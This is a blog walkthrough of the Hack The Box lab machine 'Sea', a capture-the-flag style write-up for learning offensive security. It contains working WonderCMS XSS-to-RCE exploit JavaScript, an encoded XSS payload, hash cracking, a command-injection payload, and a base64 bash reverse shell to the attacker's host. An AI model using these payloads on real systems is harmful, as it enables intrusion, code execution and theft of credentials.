---
layout: post
title: Hack The Box Walkthrough - Sea
date: 2024-11-15
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/11/HTB/Sea
img: 2024/11/Sea/Sea.png
---

In Sea, I exploited a known vulnerability in a CMS to get a shell. Then I found credentials for a user. And finally exploited another RCE vulnerability to become root.

* Room: Sea
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Sea](https://app.hackthebox.com/machines/Sea)
* Author: [FisMatHack](https://app.hackthebox.com/users/1076236)

## Enumeration

As always, I started the box by scanning for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.236.133:22
Open 10.129.236.133:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 09:35 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:35

...

Scanned at 2024-11-08 09:35:30 EST for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:

...

Uptime guess: 39.439 days (since Mon Sep 30 00:04:05 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   109.48 ms 10.10.14.1
2   102.93 ms target (10.129.236.133)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:35
Completed NSE at 09:35, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds
           Raw packets sent: 60 (4.236KB) | Rcvd: 41 (3.084KB)
```

The machine had two open ports: 22 (SSH) and 80 (HTTP). The website on port 80 created a `PHPSESSID` cookie. This hinted that it was running PHP.

## Website

I launched Caido and a browser to take a look at the website.

![Website](/assets/images/2024/11/Sea/Website.png "Website")

I looked around the site. There was a link to a contact form that used the domain 'sea.htb'. I added it to my hosts file and ran a scan for subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 262 -H "Host:FUZZ.sea.htb" "http://sea.htb"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://sea.htb/
Total requests: 653910

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000003:   400        10 L     35 W       299 Ch      "*"
000000007:   400        10 L     35 W       299 Ch      "#www"
000000006:   400        10 L     35 W       299 Ch      "#smtp"
000000005:   400        10 L     35 W       299 Ch      "#pop3"
000000004:   400        10 L     35 W       299 Ch      "#mail"

Total time: 0
Processed Requests: 653910
Filtered Requests: 653905
Requests/sec.: 0
```

It did not find anything. I also scanned for hidden pages with Feroxbuster.

```bash
$ feroxbuster -u http://sea.htb -o ferox.txt -x php -C 404 -t 25

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://sea.htb
 🚀  Threads               │ 25
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       84l      209w     3341c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      118l      226w     2731c http://sea.htb/contact.php
301      GET        7l       20w      228c http://sea.htb/data => http://sea.htb/data/
301      GET        7l       20w      231c http://sea.htb/plugins => http://sea.htb/plugins/
301      GET        7l       20w      230c http://sea.htb/themes => http://sea.htb/themes/
301      GET        7l       20w      232c http://sea.htb/messages => http://sea.htb/messages/
301      GET        7l       20w      234c http://sea.htb/data/files => http://sea.htb/data/files/
301      GET        7l       20w      235c http://sea.htb/themes/bike => http://sea.htb/themes/bike/
200      GET       21l      168w     1067c http://sea.htb/themes/bike/LICENSE
301      GET        7l       20w      239c http://sea.htb/themes/bike/img => http://sea.htb/themes/bike/img/
301      GET        7l       20w      239c http://sea.htb/themes/bike/css => http://sea.htb/themes/bike/css/
404      GET        -l        -w     3341c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
500      GET        9l       15w      227c http://sea.htb/themes/bike/theme.php
200      GET        1l        1w        6c http://sea.htb/themes/bike/version
200      GET        1l        9w       66c http://sea.htb/themes/bike/summary
[####################] - 36m  1076436/1076436 0s      found:13      errors:4584
[####################] - 35m   119601/119601  58/s    http://sea.htb/
[####################] - 35m   119601/119601  57/s    http://sea.htb/data/
[####################] - 35m   119601/119601  57/s    http://sea.htb/plugins/
[####################] - 35m   119601/119601  57/s    http://sea.htb/themes/
[####################] - 35m   119601/119601  57/s    http://sea.htb/messages/
[####################] - 35m   119601/119601  57/s    http://sea.htb/data/files/
[####################] - 35m   119601/119601  57/s    http://sea.htb/themes/bike/
[####################] - 35m   119601/119601  57/s    http://sea.htb/themes/bike/img/
[####################] - 35m   119601/119601  57/s    http://sea.htb/themes/bike/css/
```

The license page had an interesting copyright line.

```
Copyright (c) 2019 turboblack
```

I looked for this and came out with [HamsterCMS](https://github.com/turboblack/HamsterCMS). However, the site did not look to be created with that CMS. I kept looking at the site.

The site had a contact form with a field for a URL.

![Contact Form](/assets/images/2024/11/Sea/ContactForm.png "Contact Form")

I tried XSS on all the fields, that did not work. But when I entered a URL in the Website field, I got a hit on my web server a few seconds later.

```http
POST /contact.php HTTP/1.1
Host: sea.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 94
Origin: http://sea.htb
Connection: keep-alive
Referer: http://sea.htb/contact.php
Cookie: PHPSESSID=tc1lnfb901q8n3po3kvthhggsd
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=Test&email=test%40test.com&age=113&country=Ca&website=http%3A%2F%2F10.10.14.124%2Fwebsite
```

```bash
$ python -m http.server 80                                  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.173.32 - - [15/Nov/2024 14:27:03] code 404, message File not found
10.129.173.32 - - [15/Nov/2024 14:27:03] "GET /website HTTP/1.1" 404 -
```

I tried serving JS and PHP files to see if I could get code execution this way, but it did not work.

I kept looking for turboblack, and found [WonderCMS](https://github.com/turboblack/Turboblack). It's another CMS from the same author, but I missed it when I first looked at their repositories on GitHub. This one also had a [known RCE vulnerability](https://github.com/prodigiousMind/CVE-2023-41425) that could be exploited through some XSS in the login page. You needed to have an administrator to visit a link with the payload. Which I could do through the contact form.

The exploit provided did not work as is. It tried to download the reverse shell code from GitHub. But the HTB machines do not have access to the internet. So I had to download it on my machine and modify the created JS code to read if from there.

The POC was using the XSS in the login page to load more JS code. That code would then use the administrator token to install the reverse shell code as a module to the CMS. And finally, it would execute the reverse shell code. The POC was generating the JS code and opening a web server on the machine. I had to modify the generated code to load the reverse shell for my machine instead of GitHub. I decided to take the generated code and simplify it. Then serve it myself with Python simple HTTP server.

```js
var indexUrl = "http://sea.htb";

var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = indexUrl+"/?installModule=http://10.10.14.124/main.zip&directoryName=violet&type=themes&token=" + token;

var xhrGetRevShell = new XMLHttpRequest();
xhrGetRevShell.withCredentials = true;
xhrGetRevShell.open("GET", urlRev);
xhrGetRevShell.send();

xhrGetRevShell.onload = function() {
    if (xhrGetRevShell.status == 200) {
        var ip = "10.10.14.124";
        var port = "4444";
        var xhrExecuteRevShell = new XMLHttpRequest();
        xhrExecuteRevShell.withCredentials = true;
        xhrExecuteRevShell.open("GET", indexUrl+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
        xhrExecuteRevShell.send();

    }
}
```

With the code written, I started the web server. Then I posted the contact form, sending the admin to the login page with the XSS payload to load my JS.

```http
POST /contact.php HTTP/1.1
Host: sea.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 238
Origin: http://sea.htb
Connection: keep-alive
Referer: http://sea.htb/contact.php
Cookie: PHPSESSID=oarl733bufkt3qu77v7s19do74
Upgrade-Insecure-Requests: 1
Priority: u=0, i

name=Eric&email=eric%40test.com&age=-2&country=Canada&website=http%3A%2F%2Fsea.htb%2Findex.php%3Fpage%3DloginURL%3F%22%3E%3C%2Fform%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F10.10.14.124%2Fexploit.js%22%3E%3C%2Fscript%3E%3Cform%2Baction%3D%22
```

I waited a little bit and got the hits on the server.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.173.32 - - [15/Nov/2024 15:03:37] "GET /exploit.js HTTP/1.1" 200 -
10.129.173.32 - - [15/Nov/2024 15:03:46] "GET /main.zip HTTP/1.1" 200 -
10.129.173.32 - - [15/Nov/2024 15:03:46] "GET /main.zip HTTP/1.1" 200 -
10.129.173.32 - - [15/Nov/2024 15:03:46] "GET /main.zip HTTP/1.1" 200 -
10.129.173.32 - - [15/Nov/2024 15:03:46] "GET /main.zip HTTP/1.1" 200 -
```

And I got the reverse shell.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.124] from (UNKNOWN) [10.129.173.32] 38074
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 20:03:54 up  1:06,  0 users,  load average: 1.44, 1.64, 1.31
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## User amay

I was connected as the Apache user. I looked at the files in the webroot folder and quickly found one with credentials in it.

```bash
www-data@sea:/var/www/sea$ head data/database.js
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$REDACTED",
```

The database configuration had a password hash in it. I saved it to a file on my machine and cracked it with hashcat.

```bash
$ hashcat -a0 hash.txt /usr/share/seclists/rockyou.txt  -m3200
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6848/13761 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2y$10$REDACTED:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Fri Nov  8 16:14:44 2024 (41 secs)
Time.Estimated...: Fri Nov  8 16:15:25 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       75 H/s (7.21ms) @ Accel:6 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3060/14344384 (0.02%)
Rejected.........: 0/3060 (0.00%)
Restore.Point....: 3024/14344384 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: iamcool -> memories
Hardware.Mon.#1..: Util: 87%

Started: Fri Nov  8 16:13:51 2024
Stopped: Fri Nov  8 16:15:26 2024
```

There were two users on the box. I tried to SSH as them with the password I found. It worked with the first users. I could read the user flag.

```bash
$ ssh amay@target
The authenticity of host 'target (10.129.95.111)' can't be established.
ED25519 key fingerprint is SHA256:xC5wFVdcixOCmr5pOw8Tm4AajGSMT3j5Q4wL6/ZQg7A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'target' (ED25519) to the list of known hosts.
amay@target's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 08 Nov 2024 09:16:24 PM UTC

  System load:  1.8               Processes:             252
  Usage of /:   63.7% of 6.51GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.129.95.111
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Aug  5 07:16:49 2024 from 10.10.14.40

amay@sea:~$ ls
user.txt

amay@sea:~$ cat user.txt
REDACTED
```

## Root

Once connected, I looked for ways to move to the other user, or directly to root. I could not run anything with sudo. And I did not see any suspicious suid file or capabilities.

```bash
amay@sea:~$ sudo -l
[sudo] password for amay: 
Sorry, user amay may not run sudo on sea.

amay@sea:~$ find / -perm /u=s 2>/dev/null
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/snapd/21759/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/sudo
/usr/bin/umount
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine

amay@sea:~$ getcap -r / 2>/dev/null 
/snap/core20/2318/usr/bin/ping = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

When I looked for open ports, I saw that ports 42415 and 8080 were listening on localhost.

```bash
amay@sea:~$ ss -tunl
Netid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                      Peer Address:Port                   Process
udp                     UNCONN                   0                        0                                          127.0.0.53%lo:53                                             0.0.0.0:*
udp                     UNCONN                   0                        0                                                0.0.0.0:68                                             0.0.0.0:*
tcp                     LISTEN                   0                        10                                             127.0.0.1:42415                                          0.0.0.0:*
tcp                     LISTEN                   0                        511                                              0.0.0.0:80                                             0.0.0.0:*
tcp                     LISTEN                   0                        4096                                           127.0.0.1:8080                                           0.0.0.0:*
tcp                     LISTEN                   0                        4096                                       127.0.0.53%lo:53                                             0.0.0.0:*
tcp                     LISTEN                   0                        128                                              0.0.0.0:22                                             0.0.0.0:*
tcp                     LISTEN                   0                        128                                                 [::]:22                                                [::]:*
```

I opened an SSH tunnel to port 8080.

```bash
ssh -L 8081:127.0.0.1:8080 amay@target
```

Then I loaded it in my browser. It asked for a username and password.

![Internal Login](/assets/images/2024/11/Sea/InternalLogin.png "Internal Login")

I used amay's credentials and they worked. It gave me access to a page to monitor the system.

![System Monitor](/assets/images/2024/11/Sea/SystemMonitor.png "System Monitor")

There were a few actions I could run with this site. I tried them for RCE by modifying the data that was sent in Caido. Eventually I found that I could abuse the 'Analyse Log File' command by adding a semicolon and a command after the log file name.

I tried creating a file in '/tmp'.

```http
POST / HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://localhost:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://localhost:8081/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;touch /tmp/pwn&analyze_log=
```

The file was created by root.

```bash
amay@sea:~$ ls -ltrh /tmp/pwn 
-rw-r--r-- 1 root root 0 Nov 15 20:22 /tmp/pwn
```

I had code execution as root. I used that to get another reverse shell.

I created the reverse shell payload as base64.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.124/4444 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI0LzQ0NDQgMD4mMSAK
```

And sent it to the server.

```bash
POST / HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://localhost:8081
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: keep-alive
Referer: http://localhost:8081/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI0LzQ0NDQgMD4mMSAK|base64 -d|bash&analyze_log=
```

I got the hit on netcat, and I was root.

```bash
$ ssh root@target
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 08 Nov 2024 09:27:17 PM UTC

  System load:  1.49              Processes:             247
  Usage of /:   63.8% of 6.51GB   Users logged in:       1
  Memory usage: 15%               IPv4 address for eth0: 10.129.95.111
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Aug 14 15:25:51 2024

root@sea:~# cat root.txt
REDACTED
```